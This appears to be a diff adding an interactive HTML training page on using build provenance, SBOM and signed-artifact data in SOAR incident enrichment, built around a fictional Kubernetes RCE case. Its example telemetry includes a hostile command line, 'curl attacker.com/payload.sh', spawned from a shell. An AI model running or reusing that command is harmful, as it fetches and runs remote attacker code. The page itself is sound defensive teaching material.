@@ -1,0 +1,820 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Using Provenance in SOAR Enrichment and Investigation</title>
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+:root {
+  --bg: #0b1220; --panel: #141c2e; --panel-2: #1a2438; --border: #2a3650;
+  --text: #e8edf5; --muted: #8b9bb8;
+  --blue: #3b82f6; --orange: #f97316; --purple: #a855f7;
+  --teal: #14b8a6; --green: #22c55e; --red: #ef4444;
+  --line: #4a6080;
+}
+html { scroll-behavior: smooth; }
+body {
+  font-family: "Segoe UI", system-ui, sans-serif;
+  background: var(--bg); color: var(--text); line-height: 1.5; min-height: 100vh;
+}
+.page { max-width: 1400px; margin: 0 auto; padding: 1.25rem 1rem 2.5rem; }
+
+.nav-back {
+  display: inline-flex; align-items: center; margin-bottom: 1rem;
+  padding: .45rem .85rem; border-radius: 8px; border: 1px solid var(--border);
+  background: var(--panel-2); color: var(--text); text-decoration: none;
+  font-size: .85rem; font-weight: 600;
+}
+.nav-back:hover { border-color: var(--blue); }
+
+.topbar {
+  background: var(--panel); border: 1px solid var(--border); border-radius: 12px;
+  padding: 1.1rem 1.35rem; margin-bottom: .75rem;
+}
+.topbar h1 { font-size: clamp(1.1rem, 2.5vw, 1.45rem); font-weight: 650; }
+.topbar p { color: var(--muted); font-size: .88rem; margin-top: .3rem; }
+.topbar .note {
+  margin-top: .55rem; font-size: .76rem; color: var(--muted);
+  border-left: 3px solid var(--purple); padding-left: .55rem;
+}
+
+.banner {
+  font-size: .84rem; padding: .65rem .85rem; border-radius: 8px; margin-bottom: .85rem;
+  background: rgba(59,130,246,.08); border: 1px solid rgba(59,130,246,.25);
+}
+
+.controls { display: flex; flex-wrap: wrap; gap: .55rem; margin-bottom: 1rem; }
+.btn {
+  border: 1px solid var(--border); background: var(--panel-2); color: var(--text);
+  padding: .45rem .9rem; border-radius: 8px; font-size: .82rem; font-weight: 600; cursor: pointer;
+}
+.btn-purple { background: var(--purple); border-color: var(--purple); color: #fff; }
+.btn-teal { background: var(--teal); border-color: var(--teal); color: #042f2e; }
+.btn:disabled { opacity: .4; cursor: not-allowed; }
+
+/* ── Diagram (matches sketch) ── */
+.diagram-card {
+  background: var(--panel); border: 1px solid var(--border);
+  border-radius: 14px; padding: 1.5rem .75rem 1.25rem; margin-bottom: 1rem;
+  position: relative; overflow-x: auto;
+}
+.diagram-svg {
+  position: absolute; inset: 0; width: 100%; height: 100%;
+  pointer-events: none; z-index: 0;
+}
+.diagram-svg path, .diagram-svg line {
+  fill: none; stroke: var(--line); stroke-width: 2;
+  transition: stroke .4s, stroke-width .3s;
+}
+.diagram-svg .lit { stroke: var(--green); stroke-width: 2.5; }
+.diagram-svg .lit-ai { stroke: var(--teal); stroke-width: 2.5; }
+
+.diagram-body { position: relative; z-index: 1; }
+
+.flow-row {
+  display: flex; align-items: center; justify-content: flex-start;
+  gap: .25rem; flex-wrap: nowrap; min-height: 200px;
+  padding: 0 .5rem; min-width: max-content;
+}
+@media (max-width: 900px) {
+  .flow-row { flex-wrap: wrap; justify-content: flex-start; min-height: auto; gap: .75rem; }
+  .diagram-svg { display: none; }
+}
+
+.log-stack {
+  display: flex; flex-direction: column; gap: .45rem; align-items: center;
+  min-width: 100px;
+}
+.prov-stack {
+  display: flex; flex-direction: column; gap: .45rem; align-items: flex-start;
+  min-width: 110px;
+}
+
+.oval {
+  display: flex; align-items: center; justify-content: center; text-align: center;
+  min-width: 76px; max-width: 96px; min-height: 34px; padding: .3rem .45rem;
+  border-radius: 999px; border: 2px solid var(--line); background: var(--panel-2);
+  font-size: .62rem; font-weight: 600; cursor: pointer; line-height: 1.2;
+  transition: border-color .25s, box-shadow .25s, background .25s;
+}
+.oval:hover { border-color: var(--blue); }
+.oval.active { border-color: var(--blue); box-shadow: 0 0 12px rgba(59,130,246,.25); }
+.oval.lit { border-color: var(--green); background: rgba(34,197,94,.1); box-shadow: 0 0 14px rgba(34,197,94,.2); }
+.oval.log { border-color: rgba(59,130,246,.5); color: #93c5fd; }
+.oval.siem { min-width: 64px; min-height: 64px; border-color: var(--blue); color: #93c5fd; font-size: .72rem; }
+.oval.alert { border-color: rgba(59,130,246,.65); color: #93c5fd; min-height: 44px; }
+.oval.soar { border-color: rgba(168,85,247,.55); color: #d8b4fe; min-height: 44px; }
+.oval.workload {
+  min-width: 80px; min-height: 80px; border-color: var(--red); color: #fca5a5;
+  font-size: .68rem;
+}
+.oval.provenance {
+  min-width: 88px; min-height: 88px; border-color: var(--orange); color: #fdba74;
+  font-size: .68rem;
+}
+.oval.prov-item { border-color: rgba(249,115,22,.55); color: #fdba74; min-width: 92px; }
+
+.flow-arrow {
+  color: var(--line); font-size: 1.1rem; flex-shrink: 0; user-select: none;
+  transition: color .3s;
+}
+.flow-arrow.lit { color: var(--green); }
+
+/* Bracket + AI column */
+.ai-zone {
+  margin-top: 1.5rem; display: flex; flex-direction: column; align-items: center;
+}
+.bracket {
+  width: min(92%, 920px); height: 18px; margin-bottom: .35rem;
+  border: 2px solid var(--line); border-top: none; border-radius: 0 0 12px 12px;
+  transition: border-color .4s;
+}
+.bracket.lit { border-color: var(--teal); }
+.bracket-arrow { font-size: 1.25rem; color: var(--line); line-height: 1; margin-bottom: .25rem; transition: color .4s; }
+.bracket-arrow.lit { color: var(--teal); }
+
+.ai-stack {
+  display: flex; flex-direction: column; align-items: center; gap: .2rem;
+}
+.ai-box {
+  min-width: 160px; padding: .55rem .85rem; text-align: center;
+  border: 2px solid var(--border); border-radius: 8px; background: var(--panel-2);
+  font-size: .78rem; font-weight: 600; color: var(--muted);
+  transition: border-color .35s, color .35s, background .35s, box-shadow .35s;
+}
+.ai-box.lit {
+  border-color: var(--teal); color: #5eead4; background: rgba(20,184,166,.1);
+  box-shadow: 0 0 16px rgba(20,184,166,.15);
+}
+.ai-box.agent { border-color: rgba(168,85,247,.5); color: #d8b4fe; }
+.ai-box.agent.lit { border-color: var(--purple); background: rgba(168,85,247,.12); color: #e9d5ff; }
+.ai-varrow { color: var(--line); font-size: .95rem; line-height: 1; transition: color .3s; }
+.ai-varrow.lit { color: var(--teal); }
+
+.match-toast {
+  display: none; text-align: center; margin-top: 1rem; font-size: .82rem;
+  animation: fadeUp .4s ease;
+}
+.match-toast.visible { display: block; }
+.success-badge {
+  display: inline-block; padding: .35rem .7rem; border-radius: 999px;
+  background: rgba(34,197,94,.12); border: 1px solid rgba(34,197,94,.4);
+  color: var(--green); font-weight: 700; font-size: .76rem; margin-bottom: .4rem;
+}
+@keyframes fadeUp {
+  from { opacity: 0; transform: translateY(6px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+/* Detail panel */
+.detail-panel {
+  background: var(--panel); border: 1px solid var(--border);
+  border-radius: 12px; padding: 1rem 1.1rem; margin-bottom: 1rem;
+  min-height: 80px; max-height: 420px; overflow-y: auto;
+}
+.detail-panel h3 { font-size: .92rem; margin-bottom: .35rem; }
+.detail-panel .meta { font-size: .74rem; color: var(--muted); margin-bottom: .65rem; }
+.detail-panel p, .detail-panel li { font-size: .82rem; color: var(--muted); }
+.detail-panel ul { padding-left: 1.1rem; margin-top: .35rem; }
+.detail-section { margin-bottom: .75rem; }
+.detail-section h4 {
+  font-size: .68rem; text-transform: uppercase; letter-spacing: .05em;
+  color: var(--muted); margin-bottom: .3rem;
+}
+.detail-purpose { font-size: .84rem; color: var(--text); margin-bottom: .65rem; line-height: 1.5; }
+.detail-example {
+  font-size: .78rem; background: var(--panel-2); border: 1px solid var(--border);
+  border-radius: 8px; padding: .55rem .65rem; white-space: pre-wrap; color: var(--text);
+  font-family: ui-monospace, monospace; line-height: 1.45;
+}
+.detail-badges { display: flex; flex-wrap: wrap; gap: .4rem; margin-bottom: .65rem; }
+.detail-badge {
+  font-size: .68rem; font-weight: 600; padding: .2rem .5rem; border-radius: 999px;
+  border: 1px solid var(--border); background: var(--panel-2);
+}
+.detail-badge.sev-high { color: #fdba74; border-color: rgba(249,115,22,.4); }
+.detail-badge.sev-critical { color: #fca5a5; border-color: rgba(239,68,68,.4); }
+.detail-badge.sev-medium { color: #fde047; border-color: rgba(234,179,8,.4); }
+.detail-badge.step { color: #93c5fd; border-color: rgba(59,130,246,.4); }
+.tool-tags { display: flex; flex-wrap: wrap; gap: .3rem; margin-top: .25rem; }
+.tool-tag {
+  font-size: .68rem; padding: .18rem .45rem; border-radius: 6px;
+  background: var(--panel-2); border: 1px solid var(--border); color: var(--muted);
+}
+.detail-link {
+  display: inline-block; margin-top: .65rem; font-size: .76rem; font-weight: 600;
+  color: var(--orange); text-decoration: none;
+}
+.detail-link:hover { text-decoration: underline; }
+.ai-narrative-box {
+  margin-top: .65rem; padding: .6rem .7rem; border-radius: 8px; font-size: .8rem;
+  line-height: 1.5; background: rgba(168,85,247,.08); border-left: 3px solid var(--purple);
+  color: var(--text);
+}
+
+.outcome-panel { display: none; margin-bottom: 1rem; }
+.outcome-panel.visible { display: block; animation: fadeUp .4s ease; }
+.findings-grid {
+  display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+  gap: .55rem; margin-bottom: .85rem;
+}
+.finding-card {
+  padding: .65rem .75rem; border-radius: 8px; border: 1px solid var(--border);
+  background: var(--panel-2); font-size: .78rem; border-left: 3px solid var(--teal);
+  opacity: 0; transform: translateY(8px); transition: opacity .35s, transform .35s;
+}
+.finding-card.visible { opacity: 1; transform: translateY(0); }
+.finding-card .num { font-size: .65rem; color: var(--teal); font-weight: 700; margin-bottom: .2rem; }
+
+.two-col { display: grid; grid-template-columns: 1fr 1fr; gap: .65rem; }
+@media (max-width: 640px) { .two-col { grid-template-columns: 1fr; } }
+.card-block {
+  padding: .85rem; border-radius: 10px; border: 1px solid var(--border);
+  background: var(--panel); font-size: .82rem;
+}
+.card-block h4 { font-size: .7rem; text-transform: uppercase; color: var(--muted); margin-bottom: .4rem; }
+.card-block.rca { border-color: rgba(239,68,68,.35); }
+.card-block.rca h4 { color: #fca5a5; }
+.card-block.decision { border-color: rgba(168,85,247,.35); }
+.card-block.decision h4 { color: #d8b4fe; }
+.card-block ol { padding-left: 1.1rem; margin-top: .35rem; }
+.card-block li { margin-bottom: .2rem; font-size: .8rem; color: var(--muted); }
+
+.final-card {
+  padding: 1.1rem 1.25rem; border-radius: 12px; border: 1px solid var(--border);
+  border-left: 4px solid var(--teal); background: var(--panel);
+}
+.final-card h3 { font-size: .82rem; text-transform: uppercase; color: var(--teal); margin-bottom: .4rem; }
+.final-card p { font-size: .84rem; color: var(--muted); line-height: 1.55; }
+</style>
+</head>
+<body>
+<div class="page">
+  <a class="nav-back" href="soc-soar-workflow.html">← Back to SOC/SIEM/SOAR Workflow</a>
+
+  <header class="topbar">
+    <h1>Using Provenance in SOAR Enrichment and Investigation</h1>
+    <p>Connecting runtime incidents back to source code, build pipeline, SBOM, and signed artifacts</p>
+    <p class="note">Deeper dive from Step 6 (SOAR Enrichment) and Step 7 (SOAR Investigation) of the main SOC/SIEM/SOAR workflow.</p>
+  </header>
+
+  <div class="banner">SOAR can connect runtime incidents with build-time evidence to help analysts understand what changed, where it came from, and how to fix it faster.</div>
+
+  <div class="controls">
+    <button type="button" class="btn btn-purple" id="btnCorrelate">Correlate Runtime to Build Provenance</button>
+    <button type="button" class="btn btn-teal" id="btnInvestigate" disabled>Run SOAR Investigation</button>
+  </div>
+
+  <div class="diagram-card" id="diagramCard">
+    <svg class="diagram-svg" id="diagramSvg" aria-hidden="true"></svg>
+    <div class="diagram-body">
+      <div class="flow-row" id="flowRow">
+        <div class="log-stack">
+          <div class="oval log" data-node="edr" tabindex="0">EDR log</div>
+          <div class="oval log" data-node="network" tabindex="0">Network log</div>
+          <div class="oval log" data-node="identity" tabindex="0">identity</div>
+          <div class="oval log" data-node="cloud" tabindex="0">cloud</div>
+        </div>
+        <span class="flow-arrow">→</span>
+        <div class="oval siem" data-node="siem" tabindex="0">SIEM</div>
+        <span class="flow-arrow">→</span>
+        <div class="oval alert" data-node="alert" tabindex="0">Alert Generation</div>
+        <span class="flow-arrow">→</span>
+        <div class="oval soar" data-node="soar-trigger" tabindex="0">SOAR Trigger</div>
+        <span class="flow-arrow">→</span>
+        <div class="oval soar" data-node="soar-enrichment" tabindex="0">SOAR Enrichment</div>
+        <span class="flow-arrow">→</span>
+        <div class="oval workload" data-node="workload" tabindex="0">workload</div>
+        <span class="flow-arrow">→</span>
+        <div class="oval provenance" data-node="provenance" tabindex="0">Provenance</div>
+        <span class="flow-arrow" data-arrow="prov-out">→</span>
+        <div class="prov-stack">
+          <div class="oval prov-item" data-node="source" tabindex="0">Source</div>
+          <div class="oval prov-item" data-node="build" tabindex="0">Build</div>
+          <div class="oval prov-item" data-node="deployment" tabindex="0">Deployment</div>
+          <div class="oval prov-item" data-node="sbom" tabindex="0">SBOM</div>
+        </div>
+      </div>
+
+      <div class="ai-zone">
+        <div class="bracket" id="aiBracket"></div>
+        <div class="bracket-arrow" id="bracketArrow">↑</div>
+        <div class="ai-stack">
+          <div class="ai-box agent" id="aiAgent" data-node="ai-agent">AI Agent</div>
+          <div class="ai-varrow" id="arrAgentCtx">↓</div>
+          <div class="ai-box" id="aiContext" data-node="context">contextual analysis</div>
+          <div class="ai-varrow" id="arrCtxLearn">↓</div>
+          <div class="ai-box" id="aiLearning" data-node="learning">Learning</div>
+        </div>
+      </div>
+
+      <div class="match-toast" id="matchToast">
+        <div class="success-badge">✓ Runtime workload matched to verified build artifact</div>
+        <p style="color:var(--muted);max-width:560px;margin:0 auto;line-height:1.5;font-size:.82rem;">SOAR can enrich the runtime alert with provenance data to identify which repository, commit, pull request, build pipeline, SBOM, and signed artifact produced the affected workload.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="detail-panel" id="detailPanel">
+    <h3>Select a node in the diagram</h3>
+    <p class="meta">Click any oval or AI box to see context · use the buttons above to correlate and investigate</p>
+  </div>
+
+  <div class="outcome-panel" id="outcomePanel">
+    <div class="findings-grid" id="findingsGrid"></div>
+    <div class="two-col">
+      <div class="card-block rca">
+        <h4>Root Cause Analysis</h4>
+        <p>Based on runtime evidence and software supply chain context, the likely root cause is exploitation of a vulnerable dependency or recently changed application code in the payment-services repository.</p>
+      </div>
+      <div class="card-block decision">
+        <h4>Decision Support — SOAR Investigation Outcome</h4>
+        <p><strong>Incident Type:</strong> Runtime compromise</p>
+        <p><strong>Supply Chain Trust Status:</strong> <span style="color:var(--green)">Provenance verified</span></p>
+        <p><strong>Likely Cause:</strong> Vulnerable dependency or application code flaw</p>
+        <p style="margin-top:.45rem;font-size:.76rem;color:var(--muted)">Recommended Actions:</p>
+        <ol>
+          <li>Contain affected workload</li>
+          <li>Patch vulnerable dependency</li>
+          <li>Review last commit and pull request</li>
+          <li>Rotate exposed credentials</li>
+          <li>Rebuild and redeploy trusted artifact</li>
+        </ol>
+      </div>
+    </div>
+  </div>
+
+  <div class="final-card">
+    <h3>Why Provenance Matters in SOAR</h3>
+    <p>By using provenance data during SOAR Enrichment and Investigation, SOC and IR teams can move from “what happened at runtime?” to “which code, build, dependency, and deployment produced this workload?” This improves root cause analysis, speeds up patching, and reduces time to recovery.</p>
+  </div>
+</div>
+
+<script>
+(function () {
+  var DIGEST = "sha256:abc123def4567890";
+
+  function node(opts) {
+    return {
+      title: opts.title,
+      step: opts.step || null,
+      severity: opts.severity || null,
+      riskScore: opts.riskScore || null,
+      purpose: opts.purpose || "",
+      inputs: opts.inputs || [],
+      actions: opts.actions || [],
+      outputs: opts.outputs || [],
+      example: opts.example || "",
+      tools: opts.tools || [],
+      extra: opts.extra || ""
+    };
+  }
+
+  var NODE_DETAILS = {
+    edr: node({
+      title: "EDR log — Runtime Security",
+      step: "Log Sources · Step 1",
+      severity: "Critical",
+      purpose: "Runtime security tool detected anomalous process execution in the payment-api-prod pod.",
+      inputs: ["Process telemetry from container runtime", "Parent/child process relationships"],
+      actions: ["Falco rule K8s shell spawned detected java → /bin/bash", "Alert forwarded to SIEM via Fluent Bit"],
+      outputs: ["Runtime alert: unusual child process in production workload"],
+      example: "Rule: K8sShellSpawned | Process: java (PID 1842) spawned /bin/bash (PID 1843) | Pod: payment-api-prod",
+      tools: ["Falco", "Sysdig", "CrowdStrike Falcon Container"]
+    }),
+    network: node({
+      title: "Network log",
+      step: "Log Sources · Step 1",
+      severity: "High",
+      purpose: "Network telemetry captured outbound connection from compromised pod to external domain.",
+      inputs: ["VPC flow logs", "Kubernetes network policy logs", "DNS query logs"],
+      actions: ["Record TCP/443 connection to attacker.com", "Correlate source IP to pod network interface"],
+      outputs: ["Network event: outbound connection to suspicious external IP"],
+      example: "Src: 10.42.18.44 (payment-api-prod) → Dst: 198.51.100.77 (attacker.com:443) | Bytes: 4.2 KB",
+      tools: ["VPC Flow Logs", "Cilium Hubble", "CoreDNS audit"]
+    }),
+    identity: node({
+      title: "Identity telemetry",
+      step: "Log Sources · Step 1",
+      severity: "High",
+      purpose: "Identity and secrets access events show post-compromise credential use.",
+      inputs: ["Kubernetes service account audit", "Vault access logs", "IAM session events"],
+      actions: ["Track payment-api-sa token usage", "Detect secrets manager read after alert"],
+      outputs: ["Identity event: service account accessed database-password secret"],
+      example: "Service account payment-api-sa read secret/database-password at 09:05 UTC",
+      tools: ["HashiCorp Vault audit", "Okta", "Kubernetes audit logs"]
+    }),
+    cloud: node({
+      title: "Cloud / Kubernetes audit",
+      step: "Log Sources · Step 1",
+      severity: "Medium",
+      purpose: "Cloud and Kubernetes audit logs provide workload placement and deployment context.",
+      inputs: ["Kubernetes audit logs", "CloudTrail API calls", "Deployment controller events"],
+      actions: ["Resolve pod → deployment → namespace → cluster", "Capture recent rollout events"],
+      outputs: ["Cloud context: prod-east cluster, payments namespace, deployment 2h old"],
+      example: "Pod payment-api-prod | Namespace payments | Cluster prod-east | Node ip-10-0-44-12",
+      tools: ["Kubernetes API audit", "AWS CloudTrail", "EKS control plane logs"]
+    }),
+    siem: node({
+      title: "SIEM — Normalization & Correlation",
+      step: "Step 3 · SIEM",
+      severity: "Medium",
+      riskScore: 35,
+      purpose: "Normalize events and correlate runtime process telemetry with network connection within a time window.",
+      inputs: [
+        "Runtime event: bash spawned by java in payment-api-prod",
+        "Network event: outbound connection to attacker.com from same pod IP"
+      ],
+      actions: [
+        "Normalize fields (process, user, pod, src_ip, dest_ip)",
+        "Time-window correlation across runtime and network telemetry",
+        "Match detection rule: RCE_WITH_OUTBOUND_C2"
+      ],
+      outputs: ["Correlated security finding linking process execution to external C2"],
+      example: "Correlation ID CORR-88421: java → bash within 2s of TCP/443 to attacker.com",
+      tools: ["Splunk", "Microsoft Sentinel", "QRadar", "Google Security Operations"]
+    }),
+    alert: node({
+      title: "Alert Generation",
+      step: "Step 4 · SIEM",
+      severity: "High",
+      riskScore: 55,
+      purpose: "Create a formal security alert from the correlated finding with severity and evidence.",
+      inputs: ["Correlated detection rule match with supporting evidence"],
+      actions: [
+        "Assign severity based on rule and asset criticality",
+        "Attach raw evidence (events, timestamps, entities)",
+        "Trigger alert and notify on-call channel"
+      ],
+      outputs: ["Alert: Possible RCE with outbound connection — Severity High"],
+      example: "ALERT-2026-0412: Possible RCE with outbound connection | Entity: payment-api-prod | Severity: High",
+      tools: ["Splunk ES", "Sentinel Analytics", "Chronicle Rules"]
+    }),
+    "soar-trigger": node({
+      title: "SOAR Trigger",
+      step: "Step 5 · SOAR",
+      severity: "High",
+      riskScore: 58,
+      purpose: "Start the automated response playbook for Kubernetes RCE with outbound C2.",
+      inputs: ["SIEM alert ALERT-2026-0412 with entity context"],
+      actions: [
+        "Select playbook: K8s_RCE_Outbound_C2",
+        "Create case context and incident ID",
+        "Start automated workflow orchestration"
+      ],
+      outputs: ["SOAR case CASE-99102 initialized"],
+      example: "Playbook K8s_RCE_Outbound_C2 v3.2 started for alert ALERT-2026-0412",
+      tools: ["Splunk SOAR", "Cortex XSOAR", "Microsoft Sentinel Logic Apps", "Tines"]
+    }),
+    "soar-enrichment": node({
+      title: "SOAR Enrichment",
+      step: "Step 6 · SOAR",
+      severity: "High",
+      riskScore: 62,
+      purpose: "Add operational, business, and supply chain context to the alert before investigation.",
+      inputs: ["Pod name", "Namespace", "Source IP", "Destination IP", "Image digest"],
+      actions: [
+        "Query Kubernetes API for pod and deployment metadata",
+        "Query CMDB for service owner and tier",
+        "Query container registry for image digest and build pipeline",
+        "Query identity provider for service account bindings",
+        "Query ownership database for escalation contacts",
+        "Pull provenance attestation and SBOM for digest " + DIGEST
+      ],
+      outputs: ["Enriched alert context with asset, ownership, and provenance data"],
+      example: "Pod: payment-api-prod | Namespace: payments | Owner: Payments Team\nImage: " + DIGEST + " | SA: payment-api-sa\nCluster: prod-east | Deployed: ~2h ago",
+      tools: ["Kubernetes API", "ServiceNow CMDB", "ECR/GCR", "Okta", "SLSA/in-toto provenance"],
+      extra: "AI Context Builder (92% confidence): The payment-api-prod workload belonging to the Payments team was deployed approximately 2 hours ago. It established an outbound connection to attacker.com, classified as known malware infrastructure. This is the first observed external connection from this workload."
+    }),
+    workload: node({
+      title: "Runtime Workload — payment-api-prod",
+      step: "Runtime context",
+      severity: "Critical",
+      riskScore: 95,
+      purpose: "Production Kubernetes workload where the RCE and outbound C2 activity occurred.",
+      inputs: ["Runtime alerts", "Process tree", "Network connections", "Pod metadata"],
+      actions: [
+        "Observe process tree: java → bash → curl attacker.com/payload.sh",
+        "Match running image digest to build provenance",
+        "Assess blast radius in payments namespace"
+      ],
+      outputs: ["Confirmed compromised workload requiring containment"],
+      example: "Process tree: java → bash → curl attacker.com/payload.sh\nDigest: " + DIGEST + "\nNamespace: payments | SA: payment-api-sa | Severity: Critical",
+      tools: ["Falco", "kubectl", "Runtime forensics capture"]
+    }),
+    provenance: node({
+      title: "Provenance",
+      step: "Supply chain link",
+      severity: "High",
+      purpose: "Connect the running workload digest to verifiable build-time evidence: source, build, deployment, and SBOM.",
+      inputs: ["Running workload image digest", "Kubernetes deployment metadata", "Registry attestation"],
+      actions: [
+        "Resolve digest to build pipeline run",
+        "Verify SLSA/in-toto attestation chain",
+        "Link to source commit and SBOM"
+      ],
+      outputs: ["End-to-end provenance chain from code commit to running pod"],
+      example: "Digest " + DIGEST + " → GitHub Actions #789 → commit abc123 → payment-services repo",
+      tools: ["SLSA", "in-toto", "Sigstore cosign", "GitHub Actions provenance"]
+    }),
+    source: node({
+      title: "Source — Code Origin",
+      step: "Provenance · Source",
+      severity: "Medium",
+      purpose: "Identify the repository, commit, and developer responsible for the code in the running workload.",
+      inputs: ["Provenance attestation", "Git metadata from build"],
+      actions: ["Resolve repository and branch", "Identify last commit and PR", "Map to CODEOWNERS / team"],
+      outputs: ["Source attribution for remediation routing"],
+      example: "Repository: payment-services (github.com/acme/payment-services)\nCommit: abc123 | PR #456 | Author: developer@example.com",
+      tools: ["GitHub", "GitLab", "CODEOWNERS", "Service catalog"]
+    }),
+    build: node({
+      title: "Build — CI/CD Pipeline",
+      step: "Provenance · Build",
+      severity: "Medium",
+      purpose: "Verify how the container image was built, signed, and what artifacts were produced.",
+      inputs: ["Container registry digest", "Provenance attestation", "CI/CD pipeline logs"],
+      actions: [
+        "Verify image signature (cosign)",
+        "Validate provenance attestation",
+        "Retrieve SBOM generated at build time"
+      ],
+      outputs: ["Verified build artifact with matching digest"],
+      example: "GitHub Actions run #789 | Digest: " + DIGEST + "\nSignature: Valid | Provenance attestation: Verified",
+      tools: ["GitHub Actions", "cosign", "Syft", "Grype"]
+    }),
+    deployment: node({
+      title: "Deployment",
+      step: "Provenance · Deployment",
+      severity: "High",
+      purpose: "Understand when and how the artifact was deployed relative to the alert timeline.",
+      inputs: ["Kubernetes deployment history", "GitOps commit logs", "Rollout timestamps"],
+      actions: ["Identify deployment time vs alert time", "Review recent config changes", "Check rollout source (Helm/Kustomize/ArgoCD)"],
+      outputs: ["Deployment occurred 2 hours before alert — recent change correlation"],
+      example: "Deployed to prod-east ~2 hours before alert | Image: payment-api:v4.5\nGitOps: argocd/payments/payment-api-prod @ revision 7f3a2c",
+      tools: ["ArgoCD", "Flux", "Helm", "Kubernetes rollout history"]
+    }),
+    sbom: node({
+      title: "SBOM — Software Bill of Materials",
+      step: "Provenance · SBOM",
+      severity: "High",
+      purpose: "Identify vulnerable dependencies in the built artifact that may explain the exploit path.",
+      inputs: ["SBOM from build pipeline", "Vulnerability database (CVE feeds)"],
+      actions: [
+        "Parse CycloneDX/SPDX SBOM for digest " + DIGEST,
+        "Match components against CVE/KEV databases",
+        "Flag vulnerable transitive dependency"
+      ],
+      outputs: ["Vulnerable dependency identified for patching priority"],
+      example: "SBOM available (CycloneDX) · Vulnerable component: commons-text 1.8 (CVE-2022-42889)\nAlso: jackson-databind 2.9.10.8 flagged",
+      tools: ["Syft", "Grype", "Dependency-Track", "EPSS/KEV feeds"]
+    }),
+    "ai-agent": node({
+      title: "AI Agent",
+      step: "SOAR Investigation · AI layer",
+      severity: "High",
+      purpose: "Orchestrate multi-source investigation across SIEM, runtime, identity, and provenance systems.",
+      inputs: ["Enriched alert CASE-99102", "Provenance chain", "Runtime evidence"],
+      actions: [
+        "Query Kubernetes, runtime security, threat intel, GitHub, CI/CD, Vault, database",
+        "Correlate evidence across 8 sources",
+        "Draft investigation findings and RCA hypothesis"
+      ],
+      outputs: ["Automated investigation package for analyst review"],
+      example: "AI Investigation Agent activated for CASE-99102\nSources: K8s, Falco, VT, GitHub, Vault, DB audit, SBOM, provenance",
+      tools: ["Claude / LLM agent", "SOAR playbooks", "RAG over prior incidents"],
+      extra: "Investigation time: 10 minutes (vs 2 hours manual) · 12 correlated findings · 8 evidence sources"
+    }),
+    context: node({
+      title: "Contextual Analysis",
+      step: "Step 7 · SOAR Investigation",
+      severity: "High",
+      riskScore: 78,
+      purpose: "Synthesize runtime and supply chain evidence into a coherent incident narrative and findings.",
+      inputs: ["Enriched alert with pod, network, identity, and provenance context"],
+      actions: [
+        "Analyze process tree: java → bash → curl",
+        "Check destination reputation for attacker.com",
+        "Review recent deployments and image changes",
+        "Check secrets access in last 24 hours",
+        "Check database access patterns",
+        "Cross-reference SBOM vulnerabilities with exploit path"
+      ],
+      outputs: ["Investigation findings confirming malicious activity"],
+      example: "Process tree: java → bash → curl attacker.com/payload.sh\nDestination: known malware C2 | Secrets: database-password accessed\nCustomer records queried: 50,000",
+      tools: ["VirusTotal", "Threat Intel Platform", "K8s audit logs", "Secrets Manager audit", "DB audit logs"],
+      extra: "RCA hypothesis (91% confidence): Successful RCE through payment API workload followed by credential access and potential data exfiltration."
+    }),
+    learning: node({
+      title: "Learning — Feedback Loop",
+      step: "Step 13 · Lessons Learned",
+      severity: "Medium",
+      purpose: "Improve future detection, enrichment, and response using incident outcomes.",
+      inputs: ["Incident timeline", "Root cause analysis", "Response metrics (MTTD 4m, MTTR 6m)"],
+      actions: [
+        "Document lessons learned and control gaps",
+        "Update SIEM detection rules and correlation logic",
+        "Update SOAR playbook with provenance enrichment queries",
+        "Add SBOM vulnerability checks to enrichment stage",
+        "Schedule purple-team validation"
+      ],
+      outputs: ["Final incident report and playbook v3.3 deployed"],
+      example: "Post-incident: MTTD 4m, MTTR 6m · 3 detection gaps closed · Provenance query added to Step 6 playbook",
+      tools: ["Confluence", "GRC platform", "SIEM content management", "SOAR playbook editor"]
+    })
+  };
+
+  function listHtml(items) {
+    if (!items || !items.length) return "";
+    return "<ul>" + items.map(function (x) { return "<li>" + x + "</li>"; }).join("") + "</ul>";
+  }
+
+  function showDetail(nodeId) {
+    var d = NODE_DETAILS[nodeId];
+    if (!d) return;
+    activeNode = nodeId;
+    document.querySelectorAll("[data-node]").forEach(function (el) {
+      el.classList.toggle("active", el.getAttribute("data-node") === nodeId);
+    });
+
+    var badges = "";
+    if (d.step) badges += '<span class="detail-badge step">' + d.step + "</span>";
+    if (d.severity) badges += '<span class="detail-badge sev-' + d.severity.toLowerCase() + '">' + d.severity + "</span>";
+    if (d.riskScore) badges += '<span class="detail-badge">Risk ' + d.riskScore + "</span>";
+
+    var html =
+      "<h3>" + d.title + "</h3>" +
+      (badges ? '<div class="detail-badges">' + badges + "</div>" : "") +
+      (d.purpose ? '<p class="detail-purpose">' + d.purpose + "</p>" : "");
+
+    if (d.inputs.length) html += '<div class="detail-section"><h4>Inputs</h4>' + listHtml(d.inputs) + "</div>";
+    if (d.actions.length) html += '<div class="detail-section"><h4>Actions</h4>' + listHtml(d.actions) + "</div>";
+    if (d.outputs.length) html += '<div class="detail-section"><h4>Outputs</h4>' + listHtml(d.outputs) + "</div>";
+    if (d.example) html += '<div class="detail-section"><h4>Example data</h4><pre class="detail-example">' + d.example + "</pre></div>";
+    if (d.tools.length) {
+      html += '<div class="detail-section"><h4>Tools</h4><div class="tool-tags">' +
+        d.tools.map(function (t) { return '<span class="tool-tag">' + t + "</span>"; }).join("") +
+        "</div></div>";
+    }
+    if (d.extra) html += '<div class="ai-narrative-box">' + d.extra + "</div>";
+
+    html += '<a class="detail-link" href="soc-soar-workflow.html">↗ View full workflow on SOC/SIEM/SOAR page</a>';
+    detailPanel.innerHTML = html;
+  }
+
+  var FINDINGS = [
+    "Runtime behavior indicates possible remote code execution.",
+    "Running workload digest matches the signed artifact digest.",
+    "Provenance attestation is available and verified.",
+    "SBOM identifies a vulnerable dependency.",
+    "Last commit changed input parsing logic.",
+    "Deployment occurred 2 hours before the alert.",
+    "Service account accessed sensitive secrets after the alert."
+  ];
+
+  var correlated = false;
+  var investigated = false;
+  var activeNode = null;
+
+  var btnCorrelate = document.getElementById("btnCorrelate");
+  var btnInvestigate = document.getElementById("btnInvestigate");
+  var detailPanel = document.getElementById("detailPanel");
